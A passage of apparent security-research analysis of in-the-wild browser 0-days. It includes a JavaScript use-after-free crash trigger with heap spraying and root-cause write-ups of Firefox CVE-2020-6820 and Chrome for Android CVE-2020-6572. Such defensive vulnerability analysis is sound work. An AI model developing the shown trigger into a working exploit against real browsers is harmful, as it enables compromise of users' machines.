class="c1"&gt;();&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c13"&gt;&lt;span class="c2 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c6"&gt;function&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;f1&lt;/span&gt;&lt;span class="c1"&gt;()&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; alert&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c34"&gt;&amp;#39;callback 1&amp;#39;&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;return&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;spray&lt;/span&gt;&lt;span class="c1"&gt;[&lt;/span&gt;&lt;span class="c20"&gt;6000&lt;/span&gt;&lt;span class="c1"&gt;];&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c13"&gt;&lt;span class="c2 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c6"&gt;function&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;f2&lt;/span&gt;&lt;span class="c1"&gt;()&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; alert&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c34"&gt;&amp;#39;callback 2&amp;#39;&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; spray &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;null&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c8"&gt;CollectGarbage&lt;/span&gt;&lt;span class="c1"&gt;();&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;return&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c34"&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c13"&gt;&lt;span class="c2 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c6"&gt;function&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;boom&lt;/span&gt;&lt;span class="c1"&gt;()&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;var&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;e &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;o1&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;var&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;d &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;o2&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c18"&gt;// 3. the first callback (e.toString) happens&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c18"&gt;// &amp;nbsp; &amp;nbsp;it returns one of the string variables&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c18"&gt;// &amp;nbsp; &amp;nbsp;which is stored in a temporary variable&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c18"&gt;// &amp;nbsp; &amp;nbsp;on the stack, not tracked by garbage collector&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c18"&gt;// 4. Second callback (d.toString) happens&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c18"&gt;// &amp;nbsp; &amp;nbsp;There, string variables get freed&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c18"&gt;// &amp;nbsp; &amp;nbsp;and the space reclaimed&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c18"&gt;// 5. Crash happens when attempting to access&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c18"&gt;// &amp;nbsp; &amp;nbsp;string content of the temporary variable&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;var&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;b &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;e &lt;/span&gt;&lt;span class="c1"&gt;+&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;d&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; alert&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c2"&gt;b&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c13"&gt;&lt;span class="c2 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c18"&gt;// 1. create two objects with toString callbacks&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c6"&gt;var&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;o1 &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;toString&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;f1 &lt;/span&gt;&lt;span class="c1"&gt;};&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c6"&gt;var&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;o2 &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;toString&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;f2 &lt;/span&gt;&lt;span class="c1"&gt;};&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c13"&gt;&lt;span class="c2 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c18"&gt;// 2. create a bunch of string variables&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c6"&gt;for&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c6"&gt;var&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;a &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c20"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;a &lt;/span&gt;&lt;span class="c1"&gt;&amp;lt;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c20"&gt;20000&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;a&lt;/span&gt;&lt;span class="c1"&gt;++)&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; spray&lt;/span&gt;&lt;span class="c1"&gt;[&lt;/span&gt;&lt;span class="c2"&gt;a&lt;/span&gt;&lt;span class="c1"&gt;]&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c34"&gt;&amp;quot;aaa&amp;quot;&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c13"&gt;&lt;span class="c2 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;boom&lt;/span&gt;&lt;span class="c1"&gt;();&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p class="c0 c3 c13"&gt;&lt;span class="c11 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3"&gt;&lt;span&gt;In addition to the vulnerabilities themselves being very similar, the attacker used the same exploit method for each of the four 0-day exploits&lt;/span&gt;&lt;span class="c11 c4"&gt;. This provided a type of &amp;ldquo;plug and play&amp;rdquo; quality to their 0-day development which would have reduced the amount of work required for each new 0-day exploit. &lt;/span&gt;&lt;/p&gt;&lt;h2 class="c36 c3" id="h.o5e89hxj78l"&gt;&lt;span class="c33 c4"&gt;Firefox CVE-2020-6820&lt;/span&gt;&lt;/h2&gt;&lt;p class="c0 c3"&gt;&lt;span&gt;Mozilla patched &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c211" href="https://www.mozilla.org/en-US/security/advisories/mfsa2020-11/"&gt;CVE-2020-6820 in Firefox with an out-of-band security update&lt;/a&gt;&lt;/span&gt;&lt;span class="c11 c4"&gt;&amp;nbsp;in April 2020. It is a use-after-free in the Cache subsystem. &lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3 c13"&gt;&lt;span class="c11 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3"&gt;&lt;span&gt;CVE-2020-6820 is a use-after-free of the &lt;/span&gt;&lt;span class="c23"&gt;CacheStreamControlParent&lt;/span&gt;&lt;span&gt;&amp;nbsp;when closing its last open read stream. The read stream is the response returned to the context process from a cache query. If the close or abort command is received while any read streams are still open, it triggers &lt;/span&gt;&lt;span class="c23"&gt;StreamList::CloseAll&lt;/span&gt;&lt;span&gt;. If the &lt;/span&gt;&lt;span class="c23"&gt;StreamControl&lt;/span&gt;&lt;span&gt;&amp;nbsp;(must be the Parent which lives in the browser process in order to get the use-after-free in the browser process; the Child would only provide in renderer) still has &lt;/span&gt;&lt;span class="c23"&gt;ReadStreams&lt;/span&gt;&lt;span&gt;&amp;nbsp;when &lt;/span&gt;&lt;span class="c23"&gt;StreamList::CloseAll&lt;/span&gt;&lt;span&gt;&amp;nbsp;is called, then this will cause the &lt;/span&gt;&lt;span class="c23"&gt;CacheStreamControlParent&lt;/span&gt;&lt;span&gt;&amp;nbsp;to be freed. The &lt;/span&gt;&lt;span class="c23"&gt;mId&lt;/span&gt;&lt;span&gt;&amp;nbsp;member of the &lt;/span&gt;&lt;span class="c23"&gt;CacheStreamControl&lt;/span&gt;&lt;span class="c11 c4"&gt;&amp;nbsp;parent is then subsequently accessed, causing the use-after-free.&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3 c13"&gt;&lt;span class="c11 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3"&gt;&lt;span class="c11 c4"&gt;The execution patch for CVE-2020-6820 is:&lt;/span&gt;&lt;/p&gt;&lt;a id="t.3234b37aec7a6c3a6791502170cd32aec509fe5b"&gt;&lt;/a&gt;&lt;a id="t.6"&gt;&lt;/a&gt;&lt;table class="c17"&gt;&lt;tbody&gt;&lt;tr class="c26"&gt;&lt;td class="c28" colspan="1" rowspan="1"&gt;&lt;p class="c0"&gt;&lt;span class="c8"&gt;StreamList&lt;/span&gt;&lt;span class="c1"&gt;::&lt;/span&gt;&lt;span class="c8"&gt;CloseAll&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c39 c15 c19"&gt;&amp;larr;&lt;/span&gt;&lt;span class="c29 c15 c19"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c24 c15 c19"&gt;Patched&lt;/span&gt;&lt;span class="c29 c15 c19"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c15 c19 c44"&gt;function&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c8"&gt;CacheStreamControlParent&lt;/span&gt;&lt;span class="c1"&gt;::&lt;/span&gt;&lt;span class="c8"&gt;CloseAll&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c8"&gt;CacheStreamControlParent&lt;/span&gt;&lt;span class="c1"&gt;::&lt;/span&gt;&lt;span class="c8"&gt;NotifyCloseAll&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c8"&gt;StreamControl&lt;/span&gt;&lt;span class="c1"&gt;::&lt;/span&gt;&lt;span class="c8"&gt;CloseAllReadStreams&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c8 c40"&gt;For&lt;/span&gt;&lt;span class="c2 c40"&gt;&amp;nbsp;each stream&lt;/span&gt;&lt;span class="c1 c40"&gt;:&lt;/span&gt;&lt;span class="c2 c37"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c8"&gt;ReadStream&lt;/span&gt;&lt;span class="c1"&gt;::&lt;/span&gt;&lt;span class="c8"&gt;Inner&lt;/span&gt;&lt;span class="c1"&gt;::&lt;/span&gt;&lt;span class="c8"&gt;CloseStream&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c8"&gt;ReadStream&lt;/span&gt;&lt;span class="c1"&gt;::&lt;/span&gt;&lt;span class="c8"&gt;Inner&lt;/span&gt;&lt;span class="c1"&gt;::&lt;/span&gt;&lt;span class="c8"&gt;Close&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c8"&gt;ReadStream&lt;/span&gt;&lt;span class="c1"&gt;::&lt;/span&gt;&lt;span class="c8"&gt;Inner&lt;/span&gt;&lt;span class="c1"&gt;::&lt;/span&gt;&lt;span class="c8"&gt;NoteClosed&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;&amp;hellip;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c8"&gt;StreamControl&lt;/span&gt;&lt;span class="c1"&gt;::&lt;/span&gt;&lt;span class="c8"&gt;NoteClosed&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c8"&gt;StreamControl&lt;/span&gt;&lt;span class="c1"&gt;::&lt;/span&gt;&lt;span class="c8"&gt;ForgetReadStream&lt;/span&gt;&lt;span class="c2 c4"&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c8"&gt;CacheStreamControlParent&lt;/span&gt;&lt;span class="c1"&gt;/&lt;/span&gt;&lt;span class="c8"&gt;Child&lt;/span&gt;&lt;span class="c1"&gt;::&lt;/span&gt;&lt;span class="c8"&gt;NoteClosedAfterForget&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c8"&gt;CacheStreamControlParent&lt;/span&gt;&lt;span class="c1"&gt;::&lt;/span&gt;&lt;span class="c8"&gt;RecvNoteClosed&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c8"&gt;StreamList&lt;/span&gt;&lt;span class="c1"&gt;::&lt;/span&gt;&lt;span class="c8"&gt;NoteClosed&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c8"&gt;If&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8"&gt;StreamList&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;is&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;empty &lt;/span&gt;&lt;span class="c1"&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;mStreamControl&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c8"&gt;CacheStreamControlParent&lt;/span&gt;&lt;span class="c1"&gt;::&lt;/span&gt;&lt;span class="c8"&gt;Shutdown&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c8"&gt;Send__delete&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c6"&gt;this&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c29 c15 c19"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c39 c15 c19"&gt;&amp;larr;&lt;/span&gt;&lt;span class="c29 c15 c19"&gt;&amp;nbsp;FREED HERE&lt;/span&gt;&lt;span class="c15 c19 c39"&gt;!&lt;/span&gt;&lt;/p&gt;&lt;p class="c0"&gt;&lt;span class="c2"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c8"&gt;PCacheStreamControlParent&lt;/span&gt;&lt;span class="c1"&gt;::&lt;/span&gt;&lt;span class="c8"&gt;SendCloseAll&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c39 c15 c19"&gt;&amp;larr;&lt;/span&gt;&lt;span class="c29 c15 c19"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c15 c19 c24"&gt;Used&lt;/span&gt;&lt;span class="c29 c15 c19"&gt;&amp;nbsp;here &lt;/span&gt;&lt;span class="c44 c15 c19"&gt;in&lt;/span&gt;&lt;span class="c15 c19 c29"&gt;&amp;nbsp;call to &lt;/span&gt;&lt;span class="c24 c15 c19"&gt;Id&lt;/span&gt;&lt;span class="c39 c15 c19"&gt;()&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p class="c0 c3 c13"&gt;&lt;span class="c11 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3 c13"&gt;&lt;span class="c11 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3"&gt;&lt;span&gt;CVE-2020-6820 is a variant of an internally found Mozilla vulnerability, &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c211" href="https://bugzilla.mozilla.org/show_bug.cgi?id=1507180"&gt;Bug 1507180&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. 1507180 was discovered in November 2018 and &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c211" href="https://hg.mozilla.org/mozilla-central/rev/cdf525897bff"&gt;patched in December 2019&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. 1507180 is a use-after-free of the &lt;/span&gt;&lt;span class="c23"&gt;ReadStream&lt;/span&gt;&lt;span&gt;&amp;nbsp;in &lt;/span&gt;&lt;span class="c23"&gt;mReadStreamList&lt;/span&gt;&lt;span&gt;&amp;nbsp;in &lt;/span&gt;&lt;span class="c23"&gt;StreamList::CloseAll&lt;/span&gt;&lt;span&gt;. While it was patched in December, &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c211" href="https://hg.mozilla.org/mozilla-central/rev/25beb671c14a"&gt;an explanatory comment&lt;/a&gt;&lt;/span&gt;&lt;span class="c11 c4"&gt;&amp;nbsp;for why the December 2019 patch was needed was added in early March 2020. &lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3 c13"&gt;&lt;span class="c11 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3"&gt;&lt;span&gt;For 150718 the execution path was the same as for CVE-2020-6820 except that the the use-after-free occurred earlier, in &lt;/span&gt;&lt;span class="c23"&gt;StreamControl::CloseAllReadStreams&lt;/span&gt;&lt;span&gt;&amp;nbsp;rather than a few calls &amp;ldquo;higher&amp;rdquo; in &lt;/span&gt;&lt;span class="c23"&gt;StreamList::CloseAll&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span class="c11 c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3 c13"&gt;&lt;span class="c11 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3"&gt;&lt;span&gt;In my personal opinion, I have doubts about whether or not this vulnerability was actually exploited in-the-wild.&lt;/span&gt;&lt;span&gt;&amp;nbsp;As far as we know, no one (including myself or Mozilla engineers [&lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c211" href="https://bugzilla.mozilla.org/show_bug.cgi?id=1626728#c15"&gt;1&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c211" href="https://bugzilla.mozilla.org/show_bug.cgi?id=1507180#c10"&gt;2&lt;/a&gt;&lt;/span&gt;&lt;span&gt;]), has found a way to trigger this exploit without shutting down the process. Therefore, &lt;/span&gt;&lt;span&gt;exploiting this vulnerability doesn&amp;rsquo;t seem very practical.&lt;/span&gt;&lt;span&gt;&amp;nbsp;However, because it was marked as exploited in-the-wild in the advisory, it remains in our &lt;/span&gt;&lt;span class="c5"&gt;&lt;a class="c211" href="https://docs.google.com/spreadsheets/d/1lkNJ0uQwbeC1ZTRrxdtuPLCIl7mlUreoKfSIgajnSyY/edit#gid=1869060786"&gt;in-the-wild tracking spreadsheet&lt;/a&gt;&lt;/span&gt;&lt;span class="c11 c4"&gt;&amp;nbsp;and thus included in this list.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c36 c3" id="h.u7zhsxie5e9k"&gt;&lt;span&gt;Chrome for Android CVE-2020-6572&lt;/span&gt;&lt;/h2&gt;&lt;p class="c0 c3"&gt;&lt;span class="c5"&gt;&lt;a class="c211" href="https://chromereleases.googleblog.com/2020/04/stable-channel-update-for-desktop_7.html"&gt;CVE-2020-6572&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;is use-after-free in &lt;/span&gt;&lt;span class="c23"&gt;MediaCodecAudioDecoder::~MediaCodecAudioDecoder()&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c11 c4"&gt;This is Android-specific code that uses Android&amp;#39;s media decoding APIs to support playback of DRM-protected media on Android. The root of this use-after-free is that a `unique_ptr` is assigned to another, going out of scope which means it can be deleted, while at the same time a raw pointer from the originally referenced object isn&amp;#39;t updated. &amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3 c13"&gt;&lt;span class="c11 c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3"&gt;&lt;span&gt;More specifically, &lt;/span&gt;&lt;span class="c23"&gt;MediaCodecAudioDecoder::Initialize&lt;/span&gt;&lt;span&gt;&amp;nbsp;doesn&amp;#39;t reset &lt;/span&gt;&lt;span class="c23"&gt;media_crypto_context_&lt;/span&gt;&lt;span&gt;&amp;nbsp;if &lt;/span&gt;&lt;span class="c23"&gt;media_crypto_&lt;/span&gt;&lt;span&gt;&amp;nbsp;has been previously set. This can occur if &lt;/span&gt;&lt;span class="c23"&gt;MediaCodecAudioDecoder::Initialize&lt;/span&gt;&lt;span&gt;&amp;nbsp;is called twice, which is explicitly supported. This is problematic when the second initialization uses a different CDM than the first one. Each CDM owns the &lt;/span&gt;&lt;span class="c23"&gt;media_crypto_context_ &lt;/span&gt;&lt;span&gt;object&lt;/span&gt;&lt;span&gt;, and the CDM itself (&lt;/span&gt;&lt;span class="c23"&gt;cdm_context_ref_&lt;/span&gt;&lt;span&gt;) is a `unique_ptr`. Once the new CDM is set, the old CDM loses a reference and may be destructed. However, &lt;/span&gt;&lt;span class="c23"&gt;MediaCodecAudioDecoder&lt;/span&gt;&lt;span&gt;&amp;nbsp;still holds a raw pointer to &lt;/span&gt;&lt;span class="c23"&gt;media_crypto_context_&lt;/span&gt;&lt;span&gt;&amp;nbsp;from the old CDM since it wasn&amp;#39;t updated, which results in the use-after-free on &lt;/span&gt;&lt;span class="c23"&gt;media_crypto_context_&lt;/span&gt;&lt;span&gt;&amp;nbsp;(for example, in &lt;/span&gt;&lt;span class="c23"&gt;MediaCodecAudioDecoder::~MediaCodecAudioDecoder&lt;/span&gt;&lt;span class="c11 c4"&gt;). &lt;/span&gt;&lt;/p&gt;&lt;p class="c0 c3 c13"&gt;&lt;span class="c11 